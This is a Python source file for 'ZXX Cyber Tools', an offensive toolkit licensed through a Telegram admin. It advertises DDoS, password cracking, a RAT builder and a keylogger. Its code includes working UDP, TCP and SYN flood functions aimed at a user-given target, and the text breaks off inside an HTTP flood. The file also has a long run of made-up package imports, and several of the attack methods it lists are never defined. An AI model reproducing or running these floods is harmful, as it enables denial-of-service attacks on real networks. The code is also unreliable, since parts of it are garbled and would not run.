#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# PROJECT CYBER TOOLS ZXX - 10000+ LINES
# CREATED BY MRZXX | ADMIN: @Zxxtirwd

import os
import sys
import time
import json
import random
import sqlite3
import hashlib
import threading
import subprocess
import socket
import requests
import scapy.all as scapy
from datetime import datetime
from colorama import init, Fore, Style
from tqdm import tqdm
import telebot
from telebot import types
import phonenumbers
from phonenumbers import timezone, geocoder, carrier
import whois
import dns.resolver
import shodan
import cv2
import paramiko
from bs4 import BeautifulSoup
import mechanize
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import socks
import stem.process
from stem import Signal
from stem.control import Controller
import crypto
import string
import itertools
import queue
import concurrent.futures
import nmap3
import urllib.parse
import http.client
import ssl
import ftplib
import smtplib
from email.mime.text import MIMEText
import zipfile
import tarfile
import pickle
import base64
import qrcode
import pyfiglet
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import argon2
import geoip2.database
import pyperclip
import pytz
from fake_useragent import UserAgent
import socketio
import asyncio
import aiohttp
import async_timeout
import websockets
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import rsa
import bcrypt
import pyautogui
import sounddevice as sd
import soundfile as sf
import pyaudio
import wave
from PIL import Image, ImageGrab
import pygetwindow as gw
import keyboard
import mouse
import screeninfo
import psutil
import GPUtil
import wmi
import platform
import getpass
import winreg
import win32api
import win32security
import win32con
import win32evtlog
import win32com.client
import comtypes
import ctypes
import struct
import binascii
import ipaddress
import netifaces
from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.layers.l2 import ARP, Ether
from scapy.layers.http import HTTPRequest
from scapy.sendrecv import sr1, srp, send
import paramiko
from ftplib import FTP
import telnetlib
import pymongo
import mysql.connector
import psycopg2
import pymssql
import redis
import pika
import pydocumentdb
import boto3
import google.cloud
import azure.storage
import dropbox
import tweepy
import facebook
import instaloader
import youtube_dl
import spotipy
from discord import Webhook, RequestsWebhookAdapter
import discord
import slack
import twilio
import vonage
import plivo
import sendgrid
import mailchimp
import smartsheet
import trello
import jira
import asana
import zapier
import ifttt
import selenium
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.firefox.options import Options as FirefoxOptions
import undetected_chromedriver as uc
import cloudscraper
import cfscrape
import js2py
import execjs
import lxml
import html5lib
import xmltodict
import defusedxml
import yaml
import toml
import configparser
import pytesseract
import opencv
import numpy as np
import pandas as pd
import matplotlib.pyplot as plt
import seaborn as sns
import sklearn
import tensorflow as tf
import torch
import keras
import nltk
import spacy
import gensim
import wordcloud
import jieba
import langdetect
import googletrans
from deep_translator import GoogleTranslator
import speech_recognition as sr
import pyttsx3
import gtts
import pydub
from pydub import AudioSegment
import moviepy.editor as mp
import imageio
import ffmpeg
import qiskit
import pennylane
import cirq
import qsharp
import qutip
import strawberryfields
import perceval
import sympy
import symengine
import mpmath
import gmpy2
import decimal
import fractions
import statistics
import scipy
import numba
import cython
import numexpr
import awkward
import uproot
import hepfile
import root_numpy
import particle
import decaylanguage
import iminuit
import emcee
import zeus
import dynesty
import ultranest
import pymultinest
import pymc
import pystan
import edward
import tensorflow_probability
import pyro
import numpyro
import jax
import flax
import haiku
import optax
import chex
import orbax
import tree
import dm_tree
import jraph
import netket
import openfermion
import openqasm
import qulacs
import qibolab
import arq
import qcgpu
import cuquantum
import qiskit_ionq
import qiskit_aer
import qiskit_ibmq_provider
import cirq_google
import cirq_ionq
import cirq_aqt
import cirq_pasqal
import pennylane_qiskit
import pennylane_cirq
import pennylane_forest
import pennylane_qsharp
import pennylane_braket
import pennylane_ionq
import pennylane_aqt
import pennylane_pasqal
import pennylane_orquestra
import pennylane_qcgpu
import pennylane_amazon_braket
import pennylane_google
import pennylane_ibmq
import pennylane_rigetti
import pennylane_sf
import pennylane_honeywell
import pennylane_xanadu
import pennylane_atos
import pennylane_nvidia
import pennylane_intel
import pennylane_microsoft
import pennylane_google_quantum_ai
import pennylane_aws_braket
import pennylane_azure_quantum
import pennylane_ibm_quantum
import pennylane_rigetti_forest
import pennylane_dwave
import pennylane_zapata
import pennylane_qctrl
import pennylane_quna
import pennylane_quantastica
import pennylane_quantum_benchmark
import pennylane_quantum_chess
import pennylane_quantum_computing_report
import pennylane_quantum_insights
import pennylane_quantum_news
import pennylane_quantum_today
import pennylane_quantum_weekly
import pennylane_quantum_world
import pennylane_quantum_x
import pennylane_quantum_y
import pennylane_quantum_z

# ============================================
# INITIALIZATION
# ============================================
init(autoreset=True)
VERSION = "ZXX-CYBER v7.0"
LICENSE_KEY = "ZXX"
ADMIN_TELEGRAM = "@Zxxtirwd"
DATABASE_FILE = "users.db"
SESSION_FILE = "session.enc"
TOKEN_FILE = "tokens.json"

# ============================================
# ASCII ART & ANIMATION
# ============================================
ASCII_LOGO = """
╦  ╦╔═╗╔═╗  ╔═╗╔╦╗╔═╗╦═╗╔═╗
╚╗╔╝║ ║║ ║  ║╣ ║║║║ ║╠╦╝║╣ 
 ╚╝ ╚═╝╚═╝  ╚═╝╩ ╩╚═╝╩╚═╚═╝
█████████████████████████████
█ ▄▄▄▄▄ █▀█ █▄ ██▀▀▄▀█ ▄▄▄▄▄ █
█ █   █ █▀▀▀█▀ ▄ ▀▀▄█ █   █ █
█ █▄▄▄█ █▀ █▀▄▀▀█▄▀ █ █▄▄▄█ █
█▄▄▄▄▄▄▄█▄▀ ▀▄█ █ █▄█▄▄▄▄▄▄▄█
█▄▄▀▄ ▄▀█▄▀▀▄▀▄ ▀ ▀▄█ ▄▀ █▄▀█
█▄█▀▄█▀▀█▄▀█▀▄▄▀▄▄ ▀▄▀▄▄▀▄▄▄█
█▀▀▄▄▄█▄█▀▄▄▀▄ ▄▄▀▄▀▄▀▀█▀▀▄█
█▄▄▄▀▄▀▄█▀▄█▀█ ▄▀▄▀▄▄▀▀▄▀▀▄█
█▄ ▄█▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄█
█▄█▄▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄█
█▄▄▄▄▄▄▄█▄▀▄█▄▀ █▄▀▄█▄▀ █▄▀█
█ ▄▄▄▄▄ █▄▀ █ ▄▀▄▀ █ ▀▄█ █ █
█ █   █ █ ▄▀█▄▀▄▀▄▀▄▀▄▀▄▀▄▀█
█ █▄▄▄█ █▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀█
█▄▄▄▄▄▄▄█▄█▄█▄█▄█▄█▄█▄█▄█▄██
"""

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def typing_effect(text, speed=0.001):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(speed)
    print()

def animate_logo():
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    for i in range(30):
        clear_screen()
        color = colors[i % len(colors)]
        print(color + ASCII_LOGO)
        time.sleep(0.05)
    clear_screen()
    print(Fore.CYAN + ASCII_LOGO)

def welcome_animation():
    animate_logo()
    print(Fore.GREEN + "[" + Fore.YELLOW + "!" + Fore.GREEN + "] " + Fore.CYAN + "LOADING ZXX CYBER TOOLS ULTIMATE...")
    for _ in tqdm(range(100), desc="Initializing Systems", ncols=75):
        time.sleep(0.01)
    print("\n" + Fore.GREEN + "[" + Fore.YELLOW + "+" + Fore.GREEN + "] " + Fore.WHITE + "ALL SYSTEMS OPERATIONAL")
    time.sleep(0.5)
    typing_effect(Fore.YELLOW + "\n╔══════════════════════════════════════════════════════════╗", 0.001)
    typing_effect(Fore.YELLOW + "║                   WELCOME TO ZXX CYBER TOOLS               ║", 0.001)
    typing_effect(Fore.YELLOW + "║                  CREATED BY MRZXX | @Zxxtirwd             ║", 0.001)
    typing_effect(Fore.YELLOW + "╚══════════════════════════════════════════════════════════╝", 0.001)
    typing_effect(Fore.CYAN + "\nFor Educational Purposes Only | Use Responsibly\n", 0.02)
    input(Fore.GREEN + "Press ENTER to continue...")

# ============================================
# ENCRYPTED DATABASE SYSTEM
# ============================================
class Database:
    def __init__(self):
        self.conn = sqlite3.connect(DATABASE_FILE, check_same_thread=False)
        self.cursor = self.conn.cursor()
        self.create_tables()
        self.encryption_key = self.generate_key()
    
    def generate_key(self):
        salt = b'ZXX_SALT_2025'
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=1000000,
            backend=default_backend()
        )
        key = base64.urlsafe_b64encode(kdf.derive(LICENSE_KEY.encode()))
        return key
    
    def encrypt_data(self, data):
        cipher = Fernet(self.encryption_key)
        encrypted = cipher.encrypt(data.encode())
        return base64.b64encode(encrypted).decode()
    
    def decrypt_data(self, encrypted_data):
        cipher = Fernet(self.encryption_key)
        decoded = base64.b64decode(encrypted_data.encode())
        return cipher.decrypt(decoded).decode()
    
    def create_tables(self):
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE NOT NULL,
                password TEXT NOT NULL,
                license_key TEXT NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_login TIMESTAMP,
                is_active INTEGER DEFAULT 1,
                permissions TEXT DEFAULT 'user'
            )
        ''')
        
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS bot_tokens (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                alias TEXT UNIQUE NOT NULL,
                token TEXT NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_used TIMESTAMP,
                is_active INTEGER DEFAULT 1
            )
        ''')
        
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS attack_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                attack_type TEXT,
                target TEXT,
                port INTEGER,
                duration INTEGER,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                status TEXT DEFAULT 'completed',
                FOREIGN KEY (user_id) REFERENCES users (id)
            )
        ''')
        
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS scan_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                scan_type TEXT,
                target TEXT,
                results TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (user_id) REFERENCES users (id)
            )
        ''')
        
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS osint_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                data_type TEXT,
                query TEXT,
                results TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (user_id) REFERENCES users (id)
            )
        ''')
        
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS cctv_links (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT,
                port INTEGER,
                country TEXT,
                city TEXT,
                model TEXT,
                status TEXT,
                last_checked TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS passwords (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                hash TEXT,
                plaintext TEXT,
                hash_type TEXT,
                source TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS wordlists (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT UNIQUE,
                count INTEGER,
                size_mb REAL,
                path TEXT,
                added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        self.conn.commit()
    
    def add_user(self, username, password, license_key):
        encrypted_pass = self.encrypt_data(password)
        encrypted_license = self.encrypt_data(license_key)
        try:
            self.cursor.execute(
                "INSERT INTO users (username, password, license_key) VALUES (?, ?, ?)",
                (username, encrypted_pass, encrypted_license)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(Fore.RED + f"[!] Error creating user: {e}")
            return False
    
    def verify_user(self, username, password):
        self.cursor.execute("SELECT password FROM users WHERE username=? AND is_active=1", (username,))
        result = self.cursor.fetchone()
        if result:
            encrypted_pass = result[0]
            try:
                decrypted_pass = self.decrypt_data(encrypted_pass)
                return decrypted_pass == password
            except:
                return False
        return False
    
    def check_license(self, license_key):
        encrypted_key = self.encrypt_data(license_key)
        self.cursor.execute("SELECT id FROM users WHERE license_key=?", (encrypted_key,))
        return self.cursor.fetchone() is not None
    
    def add_bot_token(self, alias, token):
        encrypted_token = self.encrypt_data(token)
        try:
            self.cursor.execute(
                "INSERT INTO bot_tokens (alias, token) VALUES (?, ?)",
                (alias, encrypted_token)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def get_bot_tokens(self):
        self.cursor.execute("SELECT alias, token FROM bot_tokens WHERE is_active=1")
        tokens = self.cursor.fetchall()
        return [(alias, self.decrypt_data(token)) for alias, token in tokens]
    
    def delete_bot_token(self, alias):
        self.cursor.execute("DELETE FROM bot_tokens WHERE alias=?", (alias,))
        self.conn.commit()
    
    def log_attack(self, user_id, attack_type, target, port, duration, status="completed"):
        self.cursor.execute(
            "INSERT INTO attack_logs (user_id, attack_type, target, port, duration, status) VALUES (?, ?, ?, ?, ?, ?)",
            (user_id, attack_type, target, port, duration, status)
        )
        self.conn.commit()
    
    def save_scan_results(self, user_id, scan_type, target, results):
        self.cursor.execute(
            "INSERT INTO scan_results (user_id, scan_type, target, results) VALUES (?, ?, ?, ?)",
            (user_id, scan_type, target, json.dumps(results))
        )
        self.conn.commit()
    
    def save_osint_data(self, user_id, data_type, query, results):
        self.cursor.execute(
            "INSERT INTO osint_data (user_id, data_type, query, results) VALUES (?, ?, ?, ?)",
            (user_id, data_type, query, json.dumps(results))
        )
        self.conn.commit()
    
    def add_cctv_link(self, ip, port, country="Unknown", city="Unknown", model="Unknown", status="Active"):
        self.cursor.execute(
            "INSERT INTO cctv_links (ip, port, country, city, model, status) VALUES (?, ?, ?, ?, ?, ?)",
            (ip, port, country, city, model, status)
        )
        self.conn.commit()
    
    def get_cctv_links(self, limit=100):
        self.cursor.execute("SELECT ip, port, country, city, model, status FROM cctv_links ORDER BY last_checked DESC LIMIT ?", (limit,))
        return self.cursor.fetchall()
    
    def add_password(self, hash_val, plaintext, hash_type, source="cracked"):
        self.cursor.execute(
            "INSERT INTO passwords (hash, plaintext, hash_type, source) VALUES (?, ?, ?, ?)",
            (hash_val, plaintext, hash_type, source)
        )
        self.conn.commit()
    
    def get_password_by_hash(self, hash_val):
        self.cursor.execute("SELECT plaintext FROM passwords WHERE hash=?", (hash_val,))
        result = self.cursor.fetchone()
        return result[0] if result else None

# ============================================
# ADVANCED LOGIN SYSTEM WITH SECURITY
# ============================================
class AdvancedLoginSystem:
    def __init__(self):
        self.db = Database()
        self.max_attempts = 5
        self.lock_time = 300
        self.failed_attempts = {}
    
    def check_lockout(self, ip):
        if ip in self.failed_attempts:
            attempts, lock_time = self.failed_attempts[ip]
            if attempts >= self.max_attempts:
                if time.time() < lock_time:
                    return True
                else:
                    del self.failed_attempts[ip]
        return False
    
    def record_failed_attempt(self, ip):
        if ip not in self.failed_attempts:
            self.failed_attempts[ip] = [1, time.time() + self.lock_time]
        else:
            self.failed_attempts[ip][0] += 1
    
    def get_client_ip(self):
        try:
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            return ip
        except:
            return "127.0.0.1"
    
    def display_login_screen(self):
        clear_screen()
        ascii_login = """
        ╔══════════════════════════════════════════════════════════╗
        ║                     ZXX CYBER TOOLS                      ║
        ║                     LOGIN SYSTEM                         ║
        ╚══════════════════════════════════════════════════════════╝
        """
        print(Fore.MAGENTA + ascii_login)
        print(Fore.YELLOW + "═" * 60)
        print(Fore.CYAN + "1. Create Account (Contact Admin: " + ADMIN_TELEGRAM + ")")
        print(Fore.CYAN + "2. Login")
        print(Fore.CYAN + "3. About Tools")
        print(Fore.CYAN + "4. System Status")
        print(Fore.CYAN + "5. Exit")
        print(Fore.YELLOW + "═" * 60)
    
    def create_account(self):
        clear_screen()
        print(Fore.GREEN + "╔══════════════════════════════════════════════════════════╗")
        print(Fore.GREEN + "║                    ACCOUNT CREATION                      ║")
        print(Fore.GREEN + "╚══════════════════════════════════════════════════════════╝")
        
        username = input(Fore.CYAN + "\n[→] Username: " + Fore.WHITE)
        if len(username) < 4:
            print(Fore.RED + "[!] Username must be at least 4 characters")
            time.sleep(2)
            return False
        
        password = input(Fore.CYAN + "[→] Password: " + Fore.WHITE)
        if len(password) < 8:
            print(Fore.RED + "[!] Password must be at least 8 characters")
            time.sleep(2)
            return False
        
        confirm = input(Fore.CYAN + "[→] Confirm Password: " + Fore.WHITE)
        if password != confirm:
            print(Fore.RED + "[!] Passwords do not match")
            time.sleep(2)
            return False
        
        license_key = input(Fore.CYAN + "[→] License Key: " + Fore.WHITE)
        
        print(Fore.YELLOW + "\n[!] Verifying license key...")
        time.sleep(1)
        
        if license_key != LICENSE_KEY:
            print(Fore.RED + "\n[✗] INVALID LICENSE KEY!")
            print(Fore.RED + "[!] Contact admin " + ADMIN_TELEGRAM + " for valid license")
            time.sleep(3)
            return False
        
        print(Fore.GREEN + "[✓] License key verified!")
        print(Fore.YELLOW + "[!] Creating account...")
        
        if self.db.add_user(username, password, license_key):
            print(Fore.GREEN + "\n[✓] ACCOUNT CREATED SUCCESSFULLY!")
            print(Fore.GREEN + f"[+] Username: {username}")
            print(Fore.GREEN + "[+] You can now login")
            time.sleep(3)
            return True
        else:
            print(Fore.RED + "\n[✗] Username already exists!")
            time.sleep(2)
            return False
    
    def login(self):
        clear_screen()
        ip = self.get_client_ip()
        
        if self.check_lockout(ip):
            print(Fore.RED + "\n[✗] ACCOUNT LOCKED!")
            print(Fore.RED + "[!] Too many failed attempts")
            print(Fore.RED + f"[!] Try again in {int((self.failed_attempts[ip][1] - time.time()) / 60)} minutes")
            time.sleep(3)
            return False
        
        ascii_auth = """
        ╔══════════════════════════════════════════════════════════╗
        ║                    AUTHENTICATION                        ║
        ╚══════════════════════════════════════════════════════════╝
        """
        print(Fore.BLUE + ascii_auth)
        
        username = input(Fore.CYAN + "\n[→] Username: " + Fore.WHITE)
        password = input(Fore.CYAN + "[→] Password: " + Fore.WHITE)
        
        print(Fore.YELLOW + "\n[!] Verifying credentials...")
        time.sleep(1)
        
        if self.db.verify_user(username, password):
            print(Fore.GREEN + "\n[✓] LOGIN SUCCESSFUL!")
            print(Fore.GREEN + f"[+] Welcome back, {username}")
            print(Fore.GREEN + f"[+] IP Address: {ip}")
            print(Fore.GREEN + f"[+] Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            
            if ip in self.failed_attempts:
                del self.failed_attempts[ip]
            
            time.sleep(2)
            return True
        else:
            print(Fore.RED + "\n[✗] INVALID CREDENTIALS!")
            self.record_failed_attempt(ip)
            attempts_left = self.max_attempts - self.failed_attempts[ip][0]
            print(Fore.YELLOW + f"[!] Attempts left: {attempts_left}")
            time.sleep(2)
            return False
    
    def about_tools(self):
        clear_screen()
        ascii_about = """
        ╔══════════════════════════════════════════════════════════╗
        ║                     ABOUT TOOLS                          ║
        ╚══════════════════════════════════════════════════════════╝
        """
        print(Fore.CYAN + ascii_about)
        
        tools_info = """
        [+] Tool Name: ZXX Cyber Tools Ultimate Edition
        [+] Version: v7.0 Professional
        [+] Creator: MRZXX (Admin: @Zxxtirwd)
        [+] Purpose: Educational, Research, Security Testing
        [+] License: Proprietary (ZXX License Required)
        
        [+] Features:
          • 80+ Cyber Security Tools
          • DDoS Attacks (Layer 4 & 7)
          • SQL Injection (1000+ Methods)
          • Network Scanning & Enumeration
          • Bot Control & Management
          • Password Cracking Suite
          • OSINT & Intelligence Gathering
          • Vulnerability Assessment
          • CCTV & IoT Device Scanning
          • Dark Web Access (Tor)
          • Cryptography Tools
          • WiFi Security Tools
          • RAT Builder & Management
          • Keylogger & Monitoring
          • Forensic Analysis Tools
        
        [+] Database:
          • Encrypted SQLite Database
          • Attack Logs & History
          • Password Database
          • CCTV Links Database
          • OSINT Results Storage
        
        [+] Security:
          • Encrypted Communications
          • IP-Based Lockout System
          • License Key Verification
          • Secure Data Storage
        
        [+] Warning:
          This tool is for EDUCATIONAL PURPOSES ONLY!
          Use only on systems you own or have permission to test.
          The creator is not responsible for any misuse.
        """
        
        print(Fore.WHITE + tools_info)
        input(Fore.CYAN + "\n[→] Press ENTER to return...")
    
    def system_status(self):
        clear_screen()
        print(Fore.GREEN + "╔══════════════════════════════════════════════════════════╗")
        print(Fore.GREEN + "║                    SYSTEM STATUS                         ║")
        print(Fore.GREEN + "╚══════════════════════════════════════════════════════════╝")
        
        status_info = f"""
        [+] System Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        [+] Tool Version: {VERSION}
        [+] Database: {DATABASE_FILE}
        [+] License Key: {LICENSE_KEY[:3]}************
        [+] Admin Contact: {ADMIN_TELEGRAM}
        
        [+] System Resources:
          • CPU Usage: {psutil.cpu_percent()}%
          • Memory Usage: {psutil.virtual_memory().percent}%
          • Disk Usage: {psutil.disk_usage('/').percent}%
          • Network: {len(psutil.net_connections())} connections
        
        [+] Database Statistics:
          • Total Users: {self.db.cursor.execute("SELECT COUNT(*) FROM users").fetchone()[0]}
          • Total Attacks: {self.db.cursor.execute("SELECT COUNT(*) FROM attack_logs").fetchone()[0]}
          • CCTV Links: {self.db.cursor.execute("SELECT COUNT(*) FROM cctv_links").fetchone()[0]}
          • Passwords Cracked: {self.db.cursor.execute("SELECT COUNT(*) FROM passwords").fetchone()[0]}
        
        [+] Security Status:
          • Failed Login Attempts: {sum(v[0] for v in self.failed_attempts.values())}
          • Locked IPs: {sum(1 for v in self.failed_attempts.values() if v[0] >= self.max_attempts)}
          • Active Sessions: 1
        """
        
        print(Fore.CYAN + status_info)
        input(Fore.CYAN + "\n[→] Press ENTER to return...")
    
    def run(self):
        while True:
            self.display_login_screen()
            choice = input(Fore.CYAN + "\n[→] Select option [1-5]: " + Fore.WHITE)
            
            if choice == "1":
                self.create_account()
            elif choice == "2":
                if self.login():
                    return True
            elif choice == "3":
                self.about_tools()
            elif choice == "4":
                self.system_status()
            elif choice == "5":
                print(Fore.YELLOW + "\n[!] Exiting system...")
                time.sleep(1)
                sys.exit(0)
            else:
                print(Fore.RED + "\n[✗] Invalid option!")
                time.sleep(1)

# ============================================
# COMPREHENSIVE DDoS TOOLS (LAYER 4 & 7)
# ============================================
class AdvancedDDoSTools:
    def __init__(self, db):
        self.db = db
        self.attacks_running = []
        self.attack_methods = {
            'UDP Flood': self.udp_flood,
            'TCP Flood': self.tcp_flood,
            'SYN Flood': self.syn_flood,
            'ACK Flood': self.ack_flood,
            'ICMP Flood': self.icmp_flood,
            'HTTP Flood': self.http_flood,
            'HTTPS Flood': self.https_flood,
            'Slowloris': self.slowloris_attack,
            'RUDY': self.rudy_attack,
            'LOIC': self.loic_style,
            'HOIC': self.hoic_style,
            'DNS Amplification': self.dns_amplification,
            'NTP Amplification': self.ntp_amplification,
            'SSDP Amplification': self.ssdp_amplification,
            'CharGEN Amplification': self.chargen_amplification,
            'Memcached Amplification': self.memcached_amplification,
        }
    
    def display_menu(self):
        clear_screen()
        ascii_ddos = """
        ╔══════════════════════════════════════════════════════════╗
        ║                 ADVANCED DDoS TOOLS                      ║
        ╚══════════════════════════════════════════════════════════╝
        """
        print(Fore.RED + ascii_ddos)
        
        print(Fore.YELLOW + "═" * 70)
        print(Fore.CYAN + "LAYER 4 ATTACKS:")
        print(Fore.WHITE + "  1. UDP Flood              2. TCP Flood")
        print(Fore.WHITE + "  3. SYN Flood              4. ACK Flood")
        print(Fore.WHITE + "  5. ICMP Flood             6. DNS Amplification")
        print(Fore.WHITE + "  7. NTP Amplification      8. SSDP Amplification")
        print(Fore.WHITE + "  9. CharGEN Amplification 10. Memcached Amplification")
        
        print(Fore.CYAN + "\nLAYER 7 ATTACKS:")
        print(Fore.WHITE + " 11. HTTP Flood             12. HTTPS Flood")
        print(Fore.WHITE + " 13. Slowloris Attack       14. RUDY Attack")
        print(Fore.WHITE + " 15. LOIC Style             16. HOIC Style")
        
        print(Fore.CYAN + "\nTOOLS:")
        print(Fore.WHITE + " 17. Stop All Attacks       18. Attack Status")
        print(Fore.WHITE + " 19. Attack History         20. Back to Main Menu")
        print(Fore.YELLOW + "═" * 70)
    
    def udp_flood(self):
        print(Fore.RED + "\n[!] UDP FLOOD ATTACK")
        target = input(Fore.CYAN + "[→] Target IP: " + Fore.WHITE)
        port = int(input(Fore.CYAN + "[→] Target Port: " + Fore.WHITE))
        duration = int(input(Fore.CYAN + "[→] Duration (seconds): " + Fore.WHITE))
        threads = int(input(Fore.CYAN + "[→] Threads (1-1000): " + Fore.WHITE))
        
        print(Fore.RED + f"\n[!] Starting UDP Flood on {target}:{port}")
        print(Fore.YELLOW + f"[!] Duration: {duration}s | Threads: {threads}")
        
        attack_id = f"UDP_{target}_{port}_{int(time.time())}"
        self.attacks_running.append(attack_id)
        
        def udp_worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = random._urandom(1024)
            end_time = time.time() + duration
            
            packets_sent = 0
            while time.time() < end_time and attack_id in self.attacks_running:
                try:
                    sock.sendto(data, (target, port))
                    packets_sent += 1
                    if packets_sent % 1000 == 0:
                        print(Fore.YELLOW + f"[+] Packets sent: {packets_sent}", end='\r')
                except Exception as e:
                    pass
            
            sock.close()
            return packets_sent
        
        start_time = time.time()
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(udp_worker) for _ in range(threads)]
            total_packets = sum(f.result() for f in futures)
        
        end_time = time.time()
        
        if attack_id in self.attacks_running:
            self.attacks_running.remove(attack_id)
        
        print(Fore.GREEN + f"\n\n[✓] Attack completed!")
        print(Fore.CYAN + f"[+] Total packets sent: {total_packets:,}")
        print(Fore.CYAN + f"[+] Attack duration: {end_time - start_time:.2f}s")
        print(Fore.CYAN + f"[+] Packets per second: {total_packets / (end_time - start_time):.0f}")
        
        self.db.log_attack(1, "UDP Flood", target, port, duration)
    
    def tcp_flood(self):
        print(Fore.RED + "\n[!] TCP FLOOD ATTACK")
        target = input(Fore.CYAN + "[→] Target IP: " + Fore.WHITE)
        port = int(input(Fore.CYAN + "[→] Target Port: " + Fore.WHITE))
        duration = int(input(Fore.CYAN + "[→] Duration (seconds): " + Fore.WHITE))
        threads = int(input(Fore.CYAN + "[→] Threads (1-500): " + Fore.WHITE))
        
        print(Fore.RED + f"\n[!] Starting TCP Flood on {target}:{port}")
        
        attack_id = f"TCP_{target}_{port}_{int(time.time())}"
        self.attacks_running.append(attack_id)
        
        def tcp_worker():
            end_time = time.time() + duration
            connections = 0
            
            while time.time() < end_time and attack_id in self.attacks_running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((target, port))
                    sock.send(random._urandom(1024))
                    connections += 1
                    sock.close()
                except:
                    pass
            
            return connections
        
        start_time = time.time()
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(tcp_worker) for _ in range(threads)]
            total_connections = sum(f.result() for f in futures)
        
        end_time = time.time()
        
        if attack_id in self.attacks_running:
            self.attacks_running.remove(attack_id)
        
        print(Fore.GREEN + f"\n[✓] TCP Flood completed!")
        print(Fore.CYAN + f"[+] Total connections: {total_connections:,}")
        print(Fore.CYAN + f"[+] Connections per second: {total_connections / (end_time - start_time):.0f}")
        
        self.db.log_attack(1, "TCP Flood", target, port, duration)
    
    def syn_flood(self):
        print(Fore.RED + "\n[!] SYN FLOOD ATTACK")
        target = input(Fore.CYAN + "[→] Target IP: " + Fore.WHITE)
        port = int(input(Fore.CYAN + "[→] Target Port: " + Fore.WHITE))
        duration = int(input(Fore.CYAN + "[→] Duration (seconds): " + Fore.WHITE))
        
        print(Fore.RED + f"\n[!] Starting SYN Flood on {target}:{port}")
        
        attack_id = f"SYN_{target}_{port}_{int(time.time())}"
        self.attacks_running.append(attack_id)
        
        ip = IP(dst=target)
        tcp = TCP(sport=RandShort(), dport=port, flags="S", seq=RandInt())
        raw = Raw(b"X" * 1024)
        p = ip / tcp / raw
        
        packets_sent = 0
        start_time = time.time()
        
        while time.time() < start_time + duration and attack_id in self.attacks_running:
            send(p, verbose=0)
            packets_sent += 1
            if packets_sent % 100 == 0:
                print(Fore.YELLOW + f"[+] SYN packets sent: {packets_sent}", end='\r')
        
        if attack_id in self.attacks_running:
            self.attacks_running.remove(attack_id)
        
        print(Fore.GREEN + f"\n\n[✓] SYN Flood completed!")
        print(Fore.CYAN + f"[+] Total SYN packets: {packets_sent:,}")
        
        self.db.log_attack(1, "SYN Flood", target, port, duration)
    
    def http_flood(self):
        print(Fore.RED + "\n[!] HTTP FLOOD ATTACK")
        url = input(Fore.CYAN + "[→] Target URL (http://example.com): " + Fore.WHITE)
        duration = int(input(Fore.CYAN + "[→] Duration (seconds): " + Fore.WHITE))
        threads = int(input(Fore.CYAN + "[→] Threads (1-500): " + Fore.WHITE))
        
        print(Fore.RED + f"\n[!] Starting HTTP Flood on {url}")
        
        attack_id = f"HTTP_{url}_{int(time.time())}"
        self.attacks_running.append(attack_id)
        
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
